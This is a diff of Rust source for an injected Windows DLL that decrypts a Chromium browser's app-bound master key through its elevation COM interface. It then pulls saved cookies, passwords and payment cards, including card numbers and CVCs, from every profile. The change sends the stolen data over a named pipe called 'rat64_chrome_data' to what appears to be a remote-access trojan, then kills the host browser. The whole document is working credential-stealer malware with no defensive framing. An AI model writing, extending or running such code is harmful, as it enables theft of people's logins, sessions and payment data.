@@ -6,6 +6,7 @@ use std::{
     ffi::c_void,
     fs,
     path::{Path, PathBuf},
+    ptr,
 };
 
 use aes_gcm::{
@@ -35,7 +36,32 @@ unsafe extern "system" {
 unsafe extern "system" {
     fn GetCurrentProcess() -> *mut c_void;
     fn TerminateProcess(hProcess: *mut c_void, uExitCode: u32) -> i32;
+    fn CreateFileW(
+        lpFileName: *const u16,
+        dwDesiredAccess: u32,
+        dwShareMode: u32,
+        lpSecurityAttributes: *mut c_void,
+        dwCreationDisposition: u32,
+        dwFlagsAndAttributes: u32,
+        hTemplateFile: *mut c_void,
+    ) -> *mut c_void;
+    fn WriteFile(
+        hFile: *mut c_void,
+        lpBuffer: *const c_void,
+        nNumberOfBytesToWrite: u32,
+        lpNumberOfBytesWritten: *mut u32,
+        lpOverlapped: *mut c_void,
+    ) -> i32;
+    fn CloseHandle(hObject: *mut c_void) -> i32;
+    fn GetLastError() -> u32;
 }
+
+// Named pipe constants
+const GENERIC_WRITE: u32 = 0x40000000;
+const FILE_SHARE_READ: u32 = 0x00000001;
+const OPEN_EXISTING: u32 = 3;
+const FILE_ATTRIBUTE_NORMAL: u32 = 0x80;
+const INVALID_HANDLE_VALUE: *mut c_void = (-1isize) as *mut c_void;
 
 const RPC_C_AUTHN_DEFAULT: u32 = 0xFFFF_FFFF;
 const RPC_C_AUTHZ_DEFAULT: u32 = 0xFFFF_FFFF;
@@ -49,6 +75,7 @@ const GCM_TAG_LEN: usize = 16;
 const COOKIE_PLAINTEXT_HEADER: usize = 32;
 
 #[repr(C)]
+#[allow(non_snake_case)] // Windows COM API仕様
 struct IUnknownVtbl {
     pub QueryInterface: unsafe extern "system" fn(
         this: *mut c_void,
@@ -60,6 +87,7 @@ struct IUnknownVtbl {
 }
 
 #[repr(C)]
+#[allow(non_snake_case)] // Windows COM API仕様
 struct IElevatorVtbl {
     pub QueryInterface: unsafe extern "system" fn(
         this: *mut c_void,
@@ -207,7 +235,7 @@ fn read_app_bound_encrypted_key(local_state: &Path) -> anyhow::Result<Vec<u8>> {
 
 fn decrypt_master_key_com(cfg: &BrowserConfig, enc_key: &[u8]) -> anyhow::Result<[u8; KEY_SIZE]> {
     unsafe {
-        CoInitializeEx(None, COINIT_APARTMENTTHREADED);
+        let _ = CoInitializeEx(None, COINIT_APARTMENTTHREADED);
     }
     struct CoGuard;
     impl Drop for CoGuard {
@@ -294,7 +322,8 @@ struct CookieOut {
     value: String,
     expires: i64,
     secure: bool,
-    httpOnly: bool,
+    #[serde(rename = "httpOnly")]
+    http_only: bool,
 }
 #[derive(Serialize)]
 struct PasswordOut {
@@ -309,6 +338,26 @@ struct PaymentOut {
     expiration_year: i64,
     card_number: String,
     cvc: String,
+}
+
+// 統合データ構造（DLL内部用）
+#[derive(Serialize)]
+struct ChromeDecryptData {
+    browser_name: String,
+    profile_name: String,
+    cookies: Vec<CookieOut>,
+    passwords: Vec<PasswordOut>,
+    payments: Vec<PaymentOut>,
+}
+
+// 全プロファイルの統合データ
+#[derive(Serialize)]
+struct ChromeDecryptResult {
+    browser_type: String,
+    profiles: Vec<ChromeDecryptData>,
+    total_cookies: usize,
+    total_passwords: usize,
+    total_payments: usize,
 }
 
 fn open_sqlite_readonly(path: &Path) -> anyhow::Result<Connection> {
@@ -366,7 +415,7 @@ fn extract_cookies(conn: &Connection, key: &[u8]) -> anyhow::Result<Vec<CookieOu
                 value,
                 expires,
                 secure: is_secure,
-                httpOnly: is_httponly,
+                http_only: is_httponly,
             });
         }
     }
@@ -471,26 +520,96 @@ fn find_profiles(root: &Path) -> Vec<PathBuf> {
     profiles.into_iter().collect()
 }
 
-fn ensure_dir(p: &Path) -> anyhow::Result<()> {
-    fs::create_dir_all(p)?;
-    Ok(())
-}
-fn write_json<T: Serialize>(p: &Path, data: &Vec<T>) -> anyhow::Result<()> {
-    if data.is_empty() {
-        return Ok(());
+// ファイル書き込み関数は削除（IPC通信使用のため）
+
+// IPC通信でデータを送信（リトライ機能付き）
+fn send_data_via_ipc(data: &ChromeDecryptResult) -> anyhow::Result<()> {
+    // Debug log
+    let log_path = std::env::temp_dir().join("chrome_decrypt_debug.log");
+    let _ = std::fs::OpenOptions::new().append(true).open(&log_path)
+        .and_then(|mut f| std::io::Write::write_all(&mut f, 
+            format!("IPC: Starting data serialization\n").as_bytes()));
+    
+    // JSONでシリアライズ
+    let serialized = serde_json::to_vec(data)?;
+    
+    let _ = std::fs::OpenOptions::new().append(true).open(&log_path)
+        .and_then(|mut f| std::io::Write::write_all(&mut f, 
+            format!("IPC: Serialized {} bytes\n", serialized.len()).as_bytes()));
+    
+    // 名前付きパイプに接続してデータを送信
+    let pipe_name = r"\\.\pipe\rat64_chrome_data";
+    let mut pipe_name_wide: Vec<u16> = pipe_name.encode_utf16().collect();
+    pipe_name_wide.push(0); // null terminate
+    
+    // 最大5回リトライ
+    for attempt in 1..=5 {
+        let _ = std::fs::OpenOptions::new().append(true).open(&log_path)
+            .and_then(|mut f| std::io::Write::write_all(&mut f, 
+                format!("IPC: Attempt {} - trying to connect to pipe\n", attempt).as_bytes()));
+        unsafe {
+            let handle = CreateFileW(
+                pipe_name_wide.as_ptr(),
+                GENERIC_WRITE,
+                FILE_SHARE_READ,
+                ptr::null_mut(),
+                OPEN_EXISTING,
+                FILE_ATTRIBUTE_NORMAL,
+                ptr::null_mut(),
+            );
+            
+            if handle == INVALID_HANDLE_VALUE {
+                let error = GetLastError();
+                let _ = std::fs::OpenOptions::new().append(true).open(&log_path)
+                    .and_then(|mut f| std::io::Write::write_all(&mut f, 
+                        format!("IPC: Attempt {} failed with error {}\n", attempt, error).as_bytes()));
+                
+                if attempt < 5 {
+                    // パイプサーバーの準備を待機
+                    std::thread::sleep(std::time::Duration::from_millis(200 * attempt));
+                    continue;
+                } else {
+                    anyhow::bail!("Failed to open named pipe after {} attempts: error {}", attempt, error);
+                }
+            }
+            
+            let mut bytes_written: u32 = 0;
+            let success = WriteFile(
+                handle,
+                serialized.as_ptr() as *const c_void,
+                serialized.len() as u32,
+                &mut bytes_written,
+                ptr::null_mut(),
+            );
+            
+            CloseHandle(handle);
+            
+            if success == 0 {
+                let error = GetLastError();
+                anyhow::bail!("Failed to write to named pipe: error {}", error);
+            }
+            
+            if bytes_written != serialized.len() as u32 {
+                anyhow::bail!("Incomplete write to named pipe: {}/{}", bytes_written, serialized.len());
+            }
+            
+            // 成功
+            let _ = std::fs::OpenOptions::new().append(true).open(&log_path)
+                .and_then(|mut f| std::io::Write::write_all(&mut f, 
+                    format!("IPC: Successfully sent {} bytes to pipe\n", bytes_written).as_bytes()));
+            return Ok(());
+        }
     }
-    if let Some(parent) = p.parent() {
-        ensure_dir(parent)?;
-    }
-    let f = fs::File::create(p)?;
-    serde_json::to_writer_pretty(f, data)?;
-    Ok(())
+    
+    anyhow::bail!("All IPC connection attempts failed");
 }
 
 fn dll_worker() -> anyhow::Result<()> {
     // Debug log to file
     let log_path = std::env::temp_dir().join("chrome_decrypt_debug.log");
-    let _ = std::fs::write(&log_path, format!("DLL Worker started: {:#?}\n", std::env::current_exe()));
+    let _ = std::fs::write(&log_path, format!("DLL Worker started at {}: {:#?}\n", 
+        std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_secs(),
+        std::env::current_exe()));
     
     let cfg = match browser_config_for_host() {
         Ok(cfg) => {
@@ -530,68 +649,106 @@ fn dll_worker() -> anyhow::Result<()> {
         }
     };
 
-    // Base output: if injector provided CHROME_DECRYPT_OUT_DIR, use it; else fallback to LocalAppData
-    let base_out = if let Ok(dir) = std::env::var("CHROME_DECRYPT_OUT_DIR") {
-        PathBuf::from(dir).join("chrome_decrypt_out")
-    } else {
-        local_app_data().join("chrome_decrypt_out")
-    };
+    // データを統合してIPC通信で送信
     let profiles = find_profiles(&root);
     let _ = std::fs::write(&log_path, format!("Found {} profiles\n", profiles.len()));
     
+    let mut all_profile_data = Vec::new();
+    let mut total_cookies = 0;
+    let mut total_passwords = 0;
+    let mut total_payments = 0;
+    
     for (i, profile) in profiles.iter().enumerate() {
         let _ = std::fs::write(&log_path, format!("Processing profile {}: {:#?}\n", i, profile));
+        
+        let profile_name = profile.file_name()
+            .and_then(|n| n.to_str())
+            .unwrap_or("Unknown")
+            .to_string();
+        
+        let mut cookies = Vec::new();
+        let mut passwords = Vec::new();
+        let mut payments = Vec::new();
+        
         // Cookies
         let cookies_db = profile.join("Network").join("Cookies");
         if cookies_db.exists() {
             if let Ok(conn) = open_sqlite_readonly(&cookies_db) {
-                if let Ok(cookies) = extract_cookies(&conn, &master_key) {
-                    let out = base_out
-                        .join(cfg.name)
-                        .join(profile.file_name().unwrap_or_default())
-                        .join("cookies.json");
-                    let _ = std::fs::write(&log_path, format!("Writing {} cookies to: {:#?}\n", cookies.len(), out));
-                    let write_result = write_json(&out, &cookies);
-                    let _ = std::fs::write(&log_path, format!("Write result: {:#?}\n", write_result));
+                if let Ok(extracted_cookies) = extract_cookies(&conn, &master_key) {
+                    let _ = std::fs::write(&log_path, format!("Extracted {} cookies\n", extracted_cookies.len()));
+                    cookies = extracted_cookies;
                 }
             }
         }
+        
         // Passwords
         let login_db = profile.join("Login Data");
         if login_db.exists() {
             if let Ok(conn) = open_sqlite_readonly(&login_db) {
-                if let Ok(passwords) = extract_passwords(&conn, &master_key) {
-                    let out = base_out
-                        .join(cfg.name)
-                        .join(profile.file_name().unwrap_or_default())
-                        .join("passwords.json");
-                    let _ = std::fs::write(&log_path, format!("Writing {} passwords to: {:#?}\n", passwords.len(), out));
-                    let write_result = write_json(&out, &passwords);
-                    let _ = std::fs::write(&log_path, format!("Write result: {:#?}\n", write_result));
+                if let Ok(extracted_passwords) = extract_passwords(&conn, &master_key) {
+                    let _ = std::fs::write(&log_path, format!("Extracted {} passwords\n", extracted_passwords.len()));
+                    passwords = extracted_passwords;
                 }
             }
         }
+        
         // Payments
         let web_db = profile.join("Web Data");
         if web_db.exists() {
             if let Ok(conn) = open_sqlite_readonly(&web_db) {
-                if let Ok(payments) = extract_payments(&conn, &master_key) {
-                    let out = base_out
-                        .join(cfg.name)
-                        .join(profile.file_name().unwrap_or_default())
-                        .join("payments.json");
-                    let _ = std::fs::write(&log_path, format!("Writing {} payments to: {:#?}\n", payments.len(), out));
-                    let write_result = write_json(&out, &payments);
-                    let _ = std::fs::write(&log_path, format!("Write result: {:#?}\n", write_result));
+                if let Ok(extracted_payments) = extract_payments(&conn, &master_key) {
+                    let _ = std::fs::write(&log_path, format!("Extracted {} payments\n", extracted_payments.len()));
+                    payments = extracted_payments;
                 }
             }
         }
+        
+        total_cookies += cookies.len();
+        total_passwords += passwords.len();
+        total_payments += payments.len();
+        
+        all_profile_data.push(ChromeDecryptData {
+            browser_name: cfg.name.to_string(),
+            profile_name,
+            cookies,
+            passwords,
+            payments,
+        });
     }
+    
+    // 統合データ構造を作成
+    let result = ChromeDecryptResult {
+        browser_type: cfg.name.to_string(),
+        profiles: all_profile_data,
+        total_cookies,
+        total_passwords,
+        total_payments,
+    };
+    
+    // IPC通信でメインプロセスにデータを送信
+    let _ = std::fs::write(&log_path, format!("Attempting IPC send with {} profiles\n", result.profiles.len()));
+    match send_data_via_ipc(&result) {
+        Ok(()) => {
+            let _ = std::fs::write(&log_path, format!("Successfully sent data via IPC\n"));
+            let _ = std::fs::write(&log_path, format!("Total: {} cookies, {} passwords, {} payments\n", 
+                total_cookies, total_passwords, total_payments));
+            
+            // IPC送信完了を確認するため少し待機
+            std::thread::sleep(std::time::Duration::from_millis(100));
+        }
+        Err(e) => {
+            let _ = std::fs::write(&log_path, format!("Failed to send data via IPC: {}\n", e));
+            // IPC送信に失敗してもプロセスは終了させる
+        }
+    }
+    
     let _ = std::fs::write(&log_path, "DLL Worker function completed successfully\n");
+    
     // Kill the host process once extraction completes (as requested for suspended-launch flow)
     unsafe {
         let _ = TerminateProcess(GetCurrentProcess(), 0);
     }
+    
     Ok(())
 }
 
@@ -604,28 +761,20 @@ pub unsafe extern "system" fn DllMain(
 ) -> i32 {
     const DLL_PROCESS_ATTACH: u32 = 1;
     if reason == DLL_PROCESS_ATTACH {
-        // Immediate log to confirm DllMain is called
-        let log_path = std::env::current_dir()
-            .unwrap_or_default()
-            .join("chrome_decrypt_debug.txt");
-        let _ = std::fs::write(&log_path, "DllMain: DLL_PROCESS_ATTACH called\n");
-        
         // Spawn a new thread to avoid loader lock work in DllMain
         std::thread::spawn(move || {
-            let log_path = std::env::current_dir()
-                .unwrap_or_default()
-                .join("chrome_decrypt_debug.txt");
-            let _ = std::fs::write(&log_path, "DllMain: Worker thread spawned\n");
+            let log_path = std::env::temp_dir().join("chrome_decrypt_debug.log");
+            let _ = std::fs::write(&log_path, format!("DllMain: Worker thread spawned at {}\n", 
+                std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_secs()));
             
             // 実際の復号化処理を実行
             let result = dll_worker();
-            let _ = std::fs::write(&log_path, format!("DllMain: Worker result: {:#?}\n", result));
+            let _ = std::fs::OpenOptions::new().append(true).open(&log_path)
+                .and_then(|mut f| std::io::Write::write_all(&mut f, 
+                    format!("DllMain: Worker result: {:#?}\n", result).as_bytes()));
         });
     }
     1
 }
 
-// Ensure the library target is linked/compiled when building bins in this package.
-// Binaries automatically depend on the lib target, but referencing a symbol makes it explicit.
-#[allow(dead_code)]
-pub fn library_build_marker() {}
+// デッドコード削除：library_build_marker関数は不要
